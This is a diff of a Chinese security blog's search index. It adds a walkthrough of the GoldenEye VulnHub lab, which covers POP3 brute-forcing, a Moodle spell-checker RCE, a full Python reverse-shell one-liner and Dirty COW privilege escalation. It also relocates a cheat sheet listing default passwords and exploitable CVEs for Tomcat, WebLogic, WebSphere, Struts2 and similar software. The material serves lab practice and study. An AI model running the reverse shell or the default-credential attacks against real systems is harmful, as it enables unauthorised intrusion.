@@ -54,6 +54,54 @@
       </tags>
   </entry>
   <entry>
+    <title>GoldenEye1--靶场练习笔记</title>
+    <url>/2020/06/09/GoldenEye1--%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近比较闲，做一做靶场，让我这个菜鸡感受一下自己到底有多菜<br><a href="https://www.vulnhub.com/entry/goldeneye-1,240/" target="_blank" rel="noopener">靶场地址</a><br><img src="https://i.loli.net/2020/06/09/as8tbgMfpdoh1TR.png" alt="Image 70.png"></p><a id="more"></a>
+<h3 id="发现靶机"><a href="#发现靶机" class="headerlink" title="发现靶机"></a>发现靶机</h3><p><img src="https://i.loli.net/2020/06/09/KPAcWxaV8umhHZO.png" alt="3.png"><br>目标IP：192.168.110.129</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap信息<br><img src="https://i.loli.net/2020/06/09/4yVHdhFqnz629gU.png" alt="1.png"></p>
+<p>目录扫描信息<br>Dirsearch扫描80未发现什么目录<br><img src="https://i.loli.net/2020/06/09/r9oJDCsLqA6IGNO.png" alt="2.png"></p>
+<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><p>在主页显示/sev-home/目录可以登录<br><img src="https://i.loli.net/2020/06/09/ugRVSysLmBWHJTp.png" alt="22.png"></p>
+<p>打开目录发现需要凭证<br><img src="https://i.loli.net/2020/06/09/5NoCaAGstf3THhL.png" alt="ddd.png"></p>
+<p>查看页面源码发现有个terminal.js，跟进发现密文和俩人名<br><img src="https://i.loli.net/2020/06/09/bHoLDIOK89paCdW.png" alt="333.png"></p>
+<p>密文解密为：<br><img src="https://i.loli.net/2020/06/09/qylv5D9cHUnwIox.png" alt="323.png"></p>
+<p>登录进去就发现这个页面（账号密码这卡了好久，后来发现是tm小写，boris/InvincibleHack3r）<br><img src="https://i.loli.net/2020/06/09/KOe7m9zRrxunBsg.png" alt="222222.png"></p>
+<p>根据提示，Hydra爆破pop3服务发现两个账户密码：boris/secret1! ，natalya/bird<br><img src="https://i.loli.net/2020/06/09/KZdCng7VpW9hcUQ.png" alt="34343.png"></p>
+<p>google一下可以用telnet，尝试连接pop3，boris里面没啥重要的东西，在natalya里面找到了一个域名和账号密码<br><img src="https://i.loli.net/2020/06/09/cRWVEeqxd87jaZ9.png" alt="dadsda.png"><br><img src="https://i.loli.net/2020/06/09/BgU3pSIvKzVjiYk.png" alt="sadasd.png"></p>
+<p>根据提示，修改/etc/hosts，指定IP和域名<br><img src="https://i.loli.net/2020/06/09/fDoCIQqeM3yOjBu.png" alt="asdsadasdsa.png"></p>
+<p>用上面的给出的账号密码，登录 severnaya-station.com/gnocertdir 后，找到一个消息，里面指出了一个叫doak的运营主管。<br><img src="https://i.loli.net/2020/06/09/nKXkg32YTIZFr4p.png" alt="dsadasdas.png"></p>
+<p>再次hydra爆破doak的密码<br><img src="https://i.loli.net/2020/06/09/pk2u741XoRM38vt.png" alt="dasdas.png"></p>
+<p>telnet登录，查看邮件内容：<br><img src="https://i.loli.net/2020/06/09/YDQxKtBwlnV1Mgu.png" alt="dsadasdasa.png"></p>
+<p>使用给出的账号密码，登录系统，进去看到一个s3cret.txt的文件<br><img src="https://i.loli.net/2020/06/09/65YevOT14VwDuKx.png" alt="xzc.png"></p>
+<p>其内容指向一个图片路径<br><img src="https://i.loli.net/2020/06/09/vTxUjIBMSYg9c3N.png" alt="wwww.png"></p>
+<p>就真的是个图片<br><img src="https://i.loli.net/2020/06/09/jdySRc9OxlBZ1me.png" alt="bbbb.png"></p>
+<p>在图片属性中有一个base64编码<br><img src="https://i.loli.net/2020/06/09/z48qUuB3IDpSrl1.png" alt="sadadasdasd.png"></p>
+<p>解出来为<br><img src="https://i.loli.net/2020/06/09/gYQBukmoRVrGPpO.png" alt="dasdasd.png"></p>
+<p>根据上文s3cret.txt的内容，猜测应该是adm1n的密码<br>结果，吐了，不是adm1n的，是admin的<br><img src="https://i.loli.net/2020/06/09/LuD15l8IBt2ykX9.png" alt="dasdasdas.png"></p>
+<p>进去之后没发现啥有用的，看了一下答案说要找cms的漏洞：moodle 2.2.3<br>Google之后发现metasploit有rce脚本。<br><img src="https://i.loli.net/2020/06/09/HUAY3En9sxtGCdo.png" alt="asdasdasd.png"></p>
+<p>需要添加一下密码，域名和目录<br><img src="https://i.loli.net/2020/06/09/VtbfXDjaocOWNmJ.png" alt="dsadas.png"></p>
+<p>试了好几遍失败了，查了资料才知道要改东西<br>到这个目录里面把拼写引擎改为Pspellshell<br><img src="https://i.loli.net/2020/06/09/H9eB4F7tgb3n6mf.png" alt="dsadasdas.png"></p>
+<p>浪费大家时间了，又失败了，没找到原因，看了别人的wp，试试另外一个方法<br>第一步：<br>在目录下写入python反弹shell的脚本<br><img src="https://i.loli.net/2020/06/09/3UFRq8SLQPCAtYN.png" alt="ykk.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.110.128&quot;,65530));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
+
+<p>第二步：<br>将下面改为PspellShell<br><img src="https://i.loli.net/2020/06/09/vo1Ll4TaGmKf7FM.png" alt="dasdasd.png"></p>
+<p>第三步：<br>Kali上开启监听<br><img src="https://i.loli.net/2020/06/09/4NKPQpwqTGFEdOf.png" alt="dasdasd.png"></p>
+<p>第四步：<br>在对应Blogs下add a new entry，填点东西，然后点击最后一个ABC的按钮<br><img src="https://i.loli.net/2020/06/09/KlUL3iN2SPcF1bR.png" alt="sdasadasdas.png"></p>
+<p>成功getshell<br><img src="https://i.loli.net/2020/06/09/nMW6FyTpKqxUhSe.png" alt="dfffff.png"></p>
+<p>获取一个tty的shell<br><img src="https://i.loli.net/2020/06/09/LxCOhafQTGZz5w6.png" alt="wwwwwww.png"></p>
+<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>低权限：<br><img src="https://i.loli.net/2020/06/09/ASNdu653nIvCfKo.png" alt="dasdasd.png"></p>
+<p>看了一圈suid没发现可以利用的<br>内核提权吧<br>先wget一个提权脚本到靶机的tmp目录下<br>然后执行发现可用脏牛提权cve-2016-5195<br><img src="https://i.loli.net/2020/06/09/C1St4YnhLuVwURa.png" alt="dsadas.png"></p>
+<p>把脏牛wget到靶机<br><img src="https://i.loli.net/2020/06/09/w9sJGW26xMQDhyY.png" alt="dddd.png"></p>
+<p>编译一下，发现没有gcc，但是有cc<br><img src="https://i.loli.net/2020/06/09/nc7SYU4yzq9lGFv.png" alt="adsadasddasdsadas.png"></p>
+<p>成功获取root<br><img src="https://i.loli.net/2020/06/09/32YicxnvHZTJCAI.png" alt="dsadas.png"></p>
+<p>找flag<br><img src="https://i.loli.net/2020/06/09/oSHuUp6Fyhk9VX2.png" alt="dasas.png"><br><img src="https://i.loli.net/2020/06/09/rAD5gUMOIpfXJ3E.png" alt="sssss.png"></p>
+<p>结束<br><img src="https://i.loli.net/2020/06/09/UYKbVIouv1jMBxQ.png" alt="ddddd.png"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>GoldenEye这个靶场脑洞着实有点大，很多细节点稍有不注意或没想到就会卡很久，这个靶场做下来我大概花了3、4天，其中断过好几次，也有好几次想放弃了，但是坚持一下也做完了，舒服</p>
+]]></content>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>远程加载XSL文件达到免杀并增加文档迷惑性</title>
     <url>/2020/04/10/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDXSL%E6%96%87%E4%BB%B6%E8%BE%BE%E5%88%B0%E5%85%8D%E6%9D%80%E5%B9%B6%E5%A2%9E%E5%8A%A0%E6%96%87%E6%A1%A3%E8%BF%B7%E6%83%91%E6%80%A7/</url>
     <content><![CDATA[<p>从uknow师傅这看到的，自己动手做了一遍记录一下。原文在<a href="https://uknowsec.cn/posts/notes/%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8BXSL%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%8F%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95.html" target="_blank" rel="noopener">这里</a></p><a id="more"></a>
@@ -3048,47 +3096,6 @@
       </tags>
   </entry>
   <entry>
-    <title>（一）渗透技巧—web</title>
-    <url>/2019/04/15/%EF%BC%88%E4%B8%80%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94web/</url>
-    <content><![CDATA[<blockquote>
-<p>文章不记得从哪个公众号上拉下来的了</p>
-</blockquote><a id="more"></a>
-<h2 id="1、自定义-Web-应用"><a href="#1、自定义-Web-应用" class="headerlink" title="1、自定义 Web 应用"></a>1、自定义 Web 应用</h2><p>从公网直接攻击目标对外的 Web 应用，或者在授权的情况下在内网进行渗透测试，如果是入侵目的可以直接寻找注入、上传、代码执行、文件包含等高危漏洞，尝试获取系统权限，或者直接能拿到敏感数据。<br>允许扫描的话一般使用 WVS 直接扫描，也可以使用专门扫描特定漏洞的扫描工具如 sqlmap、XSStrike 等工具扫描特定类型的漏洞。不允许直接扫描，使用 Burp 手工慢慢找了。</p>
-<h2 id="2、Web-中间件"><a href="#2、Web-中间件" class="headerlink" title="2、Web 中间件"></a>2、Web 中间件</h2><h3 id="（1）Tomcat"><a href="#（1）Tomcat" class="headerlink" title="（1）Tomcat"></a>（1）Tomcat</h3><p>Tomcat是Apache Jakarta软件组织的一个子项目，Tomcat是一个JSP/Servlet容器，它是在SUN公司的JSWDK（Java Server Web Development Kit）基础上发展起来的一个JSP和Servlet规范的标准实现，使用Tomcat可以体验JSP和Servlet的最新规范。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口号：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。</span><br><span class="line">•   在管理后台部署 war 后门文件</span><br><span class="line">•   远程代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/399/</span><br><span class="line">http://www.freebuf.com/column/159200.html</span><br><span class="line">http://liehu.tass.com.cn/archives/836</span><br><span class="line">http://www.mottoin.com/87173.html</span><br></pre></td></tr></table></figure>
-<h3 id="（2）Jboss"><a href="#（2）Jboss" class="headerlink" title="（2）Jboss"></a>（2）Jboss</h3><p>是一个运行EJB的J2EE应用服务器。它是开放源代码的项目，遵循最新的J2EE规范。从JBoss项目开始至今，它已经从一个EJB容器发展成为一个基于的 J2EE 的一个Web 操作系统（operating system for web），它体现了 J2EE 规范中最新的技术。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令，爆破</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   反序列化</span><br><span class="line">•   远程代码执行</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.vuln.cn/6300</span><br><span class="line"></span><br><span class="line">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html</span><br><span class="line"></span><br><span class="line">https://www.zybuluo.com/websec007/note/838374</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/u011215939/article/details/79141624</span><br></pre></td></tr></table></figure>
-<h3 id="（3）WebLogic"><a href="#（3）WebLogic" class="headerlink" title="（3）WebLogic"></a>（3）WebLogic</h3><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：7001，7002</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   SSRF</span><br><span class="line">•   反序列化漏洞</span><br><span class="line">•   weblogic_uac</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br><span class="line"></span><br><span class="line">https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</span><br><span class="line"></span><br><span class="line">https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/</span><br><span class="line"></span><br><span class="line">https://bbs.pediy.com/thread-224954.htm</span><br></pre></td></tr></table></figure>
-<h3 id="4）WebSphere"><a href="#4）WebSphere" class="headerlink" title="4）WebSphere"></a>4）WebSphere</h3><p>IBM公司一套典型的电子商务应用开发工具及运行环境。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   控制台登录爆破</span><br><span class="line">•   很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。 通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。</span><br><span class="line">•   反序列化</span><br><span class="line">•   任意文件泄露</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=WebSphere&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-036803</span><br><span class="line"></span><br><span class="line">https://gist.github.com/metall0id/bb3e9bab2b7caee90cb7</span><br></pre></td></tr></table></figure>
-<h2 id="3、Web-框架"><a href="#3、Web-框架" class="headerlink" title="3、Web 框架"></a>3、Web 框架</h2><h3 id="（1）Struts2"><a href="#（1）Struts2" class="headerlink" title="（1）Struts2"></a>（1）Struts2</h3><p>Struts2是一个优雅的,可扩展的框架,用于创建企业准备的Java Web应用程序。出现的漏洞也着实的多每爆一个各大漏洞平台上就会被刷屏。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line"></span><br><span class="line">•   S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1</span><br><span class="line">•   S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28</span><br><span class="line">•   S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16</span><br><span class="line">•   S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1</span><br><span class="line">•   S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15</span><br><span class="line">•   S2-013 CVE-2013-1966 Struts 2.0.0-2.3.14</span><br><span class="line">•   S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1</span><br><span class="line">•   S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1</span><br><span class="line">参考：</span><br><span class="line">https://github.com/hktalent/myhktools</span><br><span class="line"></span><br><span class="line">https://github.com/Lucifer1993/struts-scan</span><br><span class="line"></span><br><span class="line">https://github.com/SecureSkyTechnology/study-struts2-s2-054_055-jackson-cve-2017-7525_cve-2017-15095</span><br></pre></td></tr></table></figure>
-<h3 id="（2）Spring-框架"><a href="#（2）Spring-框架" class="headerlink" title="（2）Spring 框架"></a>（2）Spring 框架</h3><p>Spring Framework 是一个开源的Java／Java EE全功能栈（full-stack）的应用程序框架，以Apache License 2.0开源许可协议的形式发布，也有.NET平台上的移植版本。Spring Framework提供了一个简易的开发方式，这种开发方式，将避免那些可能致使底层代码变得繁杂混乱的大量的属性文件和帮助类。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   CVE-2010-1622</span><br><span class="line">•   CVE-2018-1274</span><br><span class="line">•   CVE-2018-1270</span><br><span class="line">•   CVE-2018-1273</span><br><span class="line">•   反序列化</span><br><span class="line">•   目录穿越</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.inbreak.net/archives/377</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/71762.html</span><br><span class="line"></span><br><span class="line">http://www.open-open.com/news/view/1225d07</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2261</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2252</span><br></pre></td></tr></table></figure>
-<h2 id="4、Web-服务器"><a href="#4、Web-服务器" class="headerlink" title="4、Web 服务器"></a>4、Web 服务器</h2><h3 id="IIS：Windows-的-WWW-服务器"><a href="#IIS：Windows-的-WWW-服务器" class="headerlink" title="IIS：Windows 的 WWW 服务器"></a>IIS：Windows 的 WWW 服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</span><br><span class="line">•   http://www.freebuf.com/articles/4908.html</span><br><span class="line">•   https://www.anquanke.com/post/id/85811</span><br><span class="line">•   IIS，开启了 WebDAV，可以直接详服务器 PUT 文件</span><br><span class="line">•   短文件名枚举漏洞</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   提权漏洞</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
-<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
-<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://www.seebug.org/vuldb/ssvid-92538</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限。</span><br><span class="line">•   端口：80</span><br><span class="line">lighttpd</span><br><span class="line"></span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-]]></content>
-      <tags>
-        <tag>记录</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>（三）渗透技巧—数据库、缓存、消息服务</title>
     <url>/2019/04/15/%EF%BC%88%E4%B8%89%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E7%BC%93%E5%AD%98%E3%80%81%E6%B6%88%E6%81%AF%E6%9C%8D%E5%8A%A1/</url>
     <content><![CDATA[<blockquote>
@@ -3124,6 +3131,47 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>记录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>（一）渗透技巧—web</title>
+    <url>/2019/04/15/%EF%BC%88%E4%B8%80%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94web/</url>
+    <content><![CDATA[<blockquote>
+<p>文章不记得从哪个公众号上拉下来的了</p>
+</blockquote><a id="more"></a>
+<h2 id="1、自定义-Web-应用"><a href="#1、自定义-Web-应用" class="headerlink" title="1、自定义 Web 应用"></a>1、自定义 Web 应用</h2><p>从公网直接攻击目标对外的 Web 应用，或者在授权的情况下在内网进行渗透测试，如果是入侵目的可以直接寻找注入、上传、代码执行、文件包含等高危漏洞，尝试获取系统权限，或者直接能拿到敏感数据。<br>允许扫描的话一般使用 WVS 直接扫描，也可以使用专门扫描特定漏洞的扫描工具如 sqlmap、XSStrike 等工具扫描特定类型的漏洞。不允许直接扫描，使用 Burp 手工慢慢找了。</p>
+<h2 id="2、Web-中间件"><a href="#2、Web-中间件" class="headerlink" title="2、Web 中间件"></a>2、Web 中间件</h2><h3 id="（1）Tomcat"><a href="#（1）Tomcat" class="headerlink" title="（1）Tomcat"></a>（1）Tomcat</h3><p>Tomcat是Apache Jakarta软件组织的一个子项目，Tomcat是一个JSP/Servlet容器，它是在SUN公司的JSWDK（Java Server Web Development Kit）基础上发展起来的一个JSP和Servlet规范的标准实现，使用Tomcat可以体验JSP和Servlet的最新规范。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口号：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。</span><br><span class="line">•   在管理后台部署 war 后门文件</span><br><span class="line">•   远程代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/399/</span><br><span class="line">http://www.freebuf.com/column/159200.html</span><br><span class="line">http://liehu.tass.com.cn/archives/836</span><br><span class="line">http://www.mottoin.com/87173.html</span><br></pre></td></tr></table></figure>
+<h3 id="（2）Jboss"><a href="#（2）Jboss" class="headerlink" title="（2）Jboss"></a>（2）Jboss</h3><p>是一个运行EJB的J2EE应用服务器。它是开放源代码的项目，遵循最新的J2EE规范。从JBoss项目开始至今，它已经从一个EJB容器发展成为一个基于的 J2EE 的一个Web 操作系统（operating system for web），它体现了 J2EE 规范中最新的技术。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令，爆破</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   反序列化</span><br><span class="line">•   远程代码执行</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.vuln.cn/6300</span><br><span class="line"></span><br><span class="line">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html</span><br><span class="line"></span><br><span class="line">https://www.zybuluo.com/websec007/note/838374</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/u011215939/article/details/79141624</span><br></pre></td></tr></table></figure>
+<h3 id="（3）WebLogic"><a href="#（3）WebLogic" class="headerlink" title="（3）WebLogic"></a>（3）WebLogic</h3><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：7001，7002</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   SSRF</span><br><span class="line">•   反序列化漏洞</span><br><span class="line">•   weblogic_uac</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br><span class="line"></span><br><span class="line">https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</span><br><span class="line"></span><br><span class="line">https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/</span><br><span class="line"></span><br><span class="line">https://bbs.pediy.com/thread-224954.htm</span><br></pre></td></tr></table></figure>
+<h3 id="4）WebSphere"><a href="#4）WebSphere" class="headerlink" title="4）WebSphere"></a>4）WebSphere</h3><p>IBM公司一套典型的电子商务应用开发工具及运行环境。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   控制台登录爆破</span><br><span class="line">•   很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。 通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。</span><br><span class="line">•   反序列化</span><br><span class="line">•   任意文件泄露</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=WebSphere&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-036803</span><br><span class="line"></span><br><span class="line">https://gist.github.com/metall0id/bb3e9bab2b7caee90cb7</span><br></pre></td></tr></table></figure>
+<h2 id="3、Web-框架"><a href="#3、Web-框架" class="headerlink" title="3、Web 框架"></a>3、Web 框架</h2><h3 id="（1）Struts2"><a href="#（1）Struts2" class="headerlink" title="（1）Struts2"></a>（1）Struts2</h3><p>Struts2是一个优雅的,可扩展的框架,用于创建企业准备的Java Web应用程序。出现的漏洞也着实的多每爆一个各大漏洞平台上就会被刷屏。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line"></span><br><span class="line">•   S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1</span><br><span class="line">•   S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28</span><br><span class="line">•   S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16</span><br><span class="line">•   S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1</span><br><span class="line">•   S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15</span><br><span class="line">•   S2-013 CVE-2013-1966 Struts 2.0.0-2.3.14</span><br><span class="line">•   S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1</span><br><span class="line">•   S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1</span><br><span class="line">参考：</span><br><span class="line">https://github.com/hktalent/myhktools</span><br><span class="line"></span><br><span class="line">https://github.com/Lucifer1993/struts-scan</span><br><span class="line"></span><br><span class="line">https://github.com/SecureSkyTechnology/study-struts2-s2-054_055-jackson-cve-2017-7525_cve-2017-15095</span><br></pre></td></tr></table></figure>
+<h3 id="（2）Spring-框架"><a href="#（2）Spring-框架" class="headerlink" title="（2）Spring 框架"></a>（2）Spring 框架</h3><p>Spring Framework 是一个开源的Java／Java EE全功能栈（full-stack）的应用程序框架，以Apache License 2.0开源许可协议的形式发布，也有.NET平台上的移植版本。Spring Framework提供了一个简易的开发方式，这种开发方式，将避免那些可能致使底层代码变得繁杂混乱的大量的属性文件和帮助类。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   CVE-2010-1622</span><br><span class="line">•   CVE-2018-1274</span><br><span class="line">•   CVE-2018-1270</span><br><span class="line">•   CVE-2018-1273</span><br><span class="line">•   反序列化</span><br><span class="line">•   目录穿越</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.inbreak.net/archives/377</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/71762.html</span><br><span class="line"></span><br><span class="line">http://www.open-open.com/news/view/1225d07</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2261</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2252</span><br></pre></td></tr></table></figure>
+<h2 id="4、Web-服务器"><a href="#4、Web-服务器" class="headerlink" title="4、Web 服务器"></a>4、Web 服务器</h2><h3 id="IIS：Windows-的-WWW-服务器"><a href="#IIS：Windows-的-WWW-服务器" class="headerlink" title="IIS：Windows 的 WWW 服务器"></a>IIS：Windows 的 WWW 服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</span><br><span class="line">•   http://www.freebuf.com/articles/4908.html</span><br><span class="line">•   https://www.anquanke.com/post/id/85811</span><br><span class="line">•   IIS，开启了 WebDAV，可以直接详服务器 PUT 文件</span><br><span class="line">•   短文件名枚举漏洞</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   提权漏洞</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
+<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
